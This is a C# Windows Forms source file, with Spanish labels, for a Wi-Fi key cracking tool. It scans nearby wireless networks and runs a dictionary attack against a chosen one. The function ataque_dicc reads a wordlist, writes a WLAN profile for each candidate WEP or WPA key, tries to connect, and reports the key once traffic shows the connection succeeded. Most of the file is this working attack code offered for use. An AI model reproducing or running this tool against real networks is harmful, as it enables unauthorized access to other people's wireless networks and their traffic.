using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using NativeWifi;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.NetworkInformation;
using System.Diagnostics;


namespace WindowsFormsApplication2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }



        //TRANSFORMAR CADENA DE BYTES EN UN STRING HEXA

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }


        static string URL = "http://www.bitsdelocos.es/donate.php";
        public int interfaz;
        public int red;
        public int REDBSS;
        public int AVAABLENET;
        Wlan.WlanBssEntry[] lista_bss;
        private WlanClient client = new WlanClient();
        Wlan.WlanAvailableNetwork[] lista_redes;





        private void Form1_Load(object sender, EventArgs e)
        { 
            listView1.Columns.Add("ESSID");
            listView1.Columns.Add("BSSID");
            listView1.Columns.Add("Autenticación");
            listView1.Columns.Add("Cifrado");
            listView1.Columns.Add("Conectable");
            listView1.Columns.Add("Power");
            listView1.Columns.Add("Power(dBm)");
           
            listView1.Columns[5].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
            WlanClient client = new WlanClient();
            int longitud = client.Interfaces.GetLength(0);
            if (longitud != 0)
            {
                for (int i = 0; i < longitud; i++)
                {
                    listBox1.Items.Add(client.Interfaces[i].InterfaceName);
                }

            }
            else scan.Enabled = false;
        }

        static long CountLinesInFile(string f)
        {
            long count = 0;
            using (StreamReader r = new StreamReader(f))
            {
                string line;
                while ((line = r.ReadLine()) != null)
                {
                    count++;
                }

            }
            return count;
        }

        long get_session_ip() { 
            System.Net.NetworkInformation.NetworkInterface[] lista_ethernets = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
            long session = 0;int j = lista_ethernets.GetLength(0);
         for (int i = 0; i < j; i++) {
             if (String.Compare(lista_ethernets[i].Name, client.Interfaces[interfaz].InterfaceName, StringComparison.OrdinalIgnoreCase) == 0)
             {
                  session =lista_ethernets[i].GetIPv4Statistics().BytesReceived;
                 break;
             }
         }
            return session;

        }


        private Boolean key_valid(string key, string cifrado)
        {
            if (cifrado == "WEP" && (key.Length == 5 || key.Length == 13))
                return true;
            else if (cifrado != "WEP" && key.Length > 5 && key.Length < 64)
                return true;
            else return false;

        }




        
        private  void ataque_dicc(string nombre_red, string cifrado, string diccionario, string auth, int timeout)
        {

            System.Net.NetworkInformation.NetworkInterface[] lista_ethernets = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
            long session =get_session_ip();
            bool connected = false;
            long lineas = CountLinesInFile(diccionario);
           
            progressBar1.Visible = true;
            progressBar1.Maximum = (int)lineas;
            progressBar1.Value = 1;
            progressBar1.Step = 1;
            progressBar1.Update();
            string profileXml;
            string key = "";
            string tipo_key = "";
            string index_key = "";
            System.IO.StreamReader reader = new StreamReader(diccionario);

            while (!connected && !reader.EndOfStream)
            {
                key = reader.ReadLine();
                if (key_valid(key,cifrado)){
                tipo_key = "passPhrase";
                if (cifrado == "WEP")
                    tipo_key = "networkKey";
                if (auth == "open") { index_key = "<keyIndex>0</keyIndex>"; }


                label8.Text = "Probando  " + key; label8.Visible = true; label8.Update();
                profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>{2}</authentication><encryption>{3}</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>{4}</keyType><protected>false</protected><keyMaterial>{1}</keyMaterial></sharedKey>{5}</security></MSM></WLANProfile>", nombre_red, key, auth, cifrado, tipo_key, index_key);
                client.Interfaces[interfaz].SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);

                client.Interfaces[interfaz].Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, nombre_red);
                progressBar1.PerformStep();
                progressBar1.Update();


                while (client.Interfaces[interfaz].InterfaceState == Wlan.WlanInterfaceState.Associating || client.Interfaces[interfaz].InterfaceState == Wlan.WlanInterfaceState.Authenticating)
                {
                    Thread.Sleep(50);
                }

                Thread.Sleep(timeout * 1000);


                int j = lista_ethernets.GetLength(0);
                for (int i = 0; i < j; i++)
                {
                    if (String.Compare(lista_ethernets[i].Name, client.Interfaces[interfaz].InterfaceName, StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        if (lista_ethernets[i].GetIPv4Statistics().BytesReceived - session  > 3)
                        {
                            connected = true;label8.Visible = false;
                        }

                    }
                }
                if (!connected)
                {
                    client.Interfaces[interfaz].DeleteProfile(nombre_red);
                    
                }
                Thread.Sleep(50);

            }
        }
            if (connected)
            {
                Thread.Sleep(1000);
                label9.Visible = true; 
                label8.Text = key; 
                label8.Visible = true;
            }
            else label8.Text = "No se encontro la clave";

        }






        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            interfaz = listBox1.SelectedIndex;
        }



        private bool compara(Wlan.Dot11Ssid X, Wlan.Dot11Ssid Y)
        {
            int i = 0;
            if (X.SSIDLength != Y.SSIDLength) return false;
            while (i < X.SSIDLength & Y.SSID[i] == X.SSID[i])
            {
                i++;
            }

            return Y.SSID[i] == X.SSID[i];
        }




        private Wlan.WlanAvailableNetwork devuelve_red(Wlan.Dot11Ssid X, Wlan.WlanAvailableNetwork[] lista)
        {
            Wlan.WlanAvailableNetwork ret = new Wlan.WlanAvailableNetwork();
            int long2 = lista.GetLength(0);

            for (int i = 0; i < long2; i++)
            {
                if (compara(X, lista[i].dot11Ssid))
                {
                    ret = lista[i];
                    break;
                }
            }
            return ret;


        }
        private void actualizar()
        {
            lista_bss = client.Interfaces[interfaz].GetNetworkBssList();

            client.Interfaces[interfaz].Scan();

            lista_redes = client.Interfaces[interfaz].GetAvailableNetworkList(0);
            listView1.Items.Clear();
            int longitud = lista_bss.GetLength(0);
            Wlan.WlanAvailableNetwork WLAN = new Wlan.WlanAvailableNetwork();
            for (int i = 0; i < longitud; i++)
            {
                WLAN = devuelve_red(lista_bss[i].dot11Ssid, lista_redes);


                ListViewItem item1 = new ListViewItem(Encoding.ASCII.GetString(lista_bss[i].dot11Ssid.SSID));
                item1.SubItems.Add(ByteArrayToString(lista_bss[i].dot11Bssid));
                item1.SubItems.Add(WLAN.dot11DefaultAuthAlgorithm.ToString());
                item1.SubItems.Add(WLAN.dot11DefaultCipherAlgorithm.ToString());
                item1.SubItems.Add(WLAN.networkConnectable.ToString());
                item1.SubItems.Add(WLAN.wlanSignalQuality.ToString());
                item1.SubItems.Add(lista_bss[i].rssi.ToString());
                listView1.Items.Add(item1);
                listView1.Columns[1].AutoResize(ColumnHeaderAutoResizeStyle.ColumnContent);


            }
        }
        private void scan_Click(object sender, EventArgs e)
        {
            if (scan.Text == "Scan")
            {

                scan.Text = "Stop";

                label9.Visible = false;
                timer1.Enabled = true;
                actualizar();
            }
            else
            {
                scan.Text = "Scan";
                timer1.Enabled = false;
            }


        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                REDBSS = listView1.SelectedIndices[0];
                textBox1.Text = Encoding.ASCII.GetString(lista_bss[REDBSS].dot11Ssid.SSID);
                Wlan.WlanAvailableNetwork WLAN = devuelve_red(lista_bss[REDBSS].dot11Ssid, lista_redes);
                textBox3.Text = (WLAN.dot11DefaultAuthAlgorithm.ToString());
                textBox2.Text = (WLAN.dot11DefaultCipherAlgorithm.ToString());
            }
            catch { }



        }


        //LAS SIGUIENTES FUNCIONES SE USAN PARA CONVERTIR LOS PARAMETROS DE LA CONEXION A PARAMETROS DEL PERFIL DE RED
        private string auth(string autenticate)
        {
            if (autenticate == "IEEE80211_Open") { return "open"; }
            if (autenticate == "IEEE80211_SharedKey") { return "shared"; }
            else if (autenticate == "WPA") { return "WPA"; }
            else if (autenticate == "WPA_PSK") { return "WPAPSK"; }
            else if (autenticate == "RSNA_PSK") { return "WPA2PSK"; }
            return "";

        }
        private string cif(string cipher)
        {
            if (cipher == "CCMP") { return "AES"; }
            else if (cipher == "TKIP") { return "TKIP"; }
            else if (cipher == "WEP") { return "WEP"; }
            return "";

        }


       


        private void button1_Click(object sender, EventArgs e)
        {
            label9.Visible = false;

            if (textBox1.Text != "" && textBox2.Text != "" && textBox3.Text != "" && textBox4.Text != "")
            {

                string cifrado = cif(textBox2.Text);
                string autenticacion = auth(textBox3.Text);
                if (cifrado == "" || autenticacion == "")
                {
                    label8.Text = "No implementado aún";
                    label8.Visible = true;
                }

                label8.Visible = false;
                label5.Visible = true;
                progressBar1.Visible = true;
                timer1.Enabled = false;
                ataque_dicc(textBox1.Text, cifrado, textBox4.Text, autenticacion, (int)(numericUpDown1.Value));
                timer1.Enabled = true;
                label5.Visible = false;
                progressBar1.Visible = false;
            }
            else
            {
                label8.Text = "Debes rellenar todos los campos";
                label8.Visible = true;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.AddExtension = true;
            openFileDialog1.AutoUpgradeEnabled = true;
            openFileDialog1.CheckFileExists = true;
            openFileDialog1.CheckPathExists = true;
            openFileDialog1.Multiselect = false;
            openFileDialog1.ShowDialog();


        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            textBox4.Text = openFileDialog1.FileName; button1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            actualizar();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo(e.Link.LinkData.ToString());
            Process.Start(sInfo);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo(URL);
            Process.Start(sInfo);

        }




    
    }
}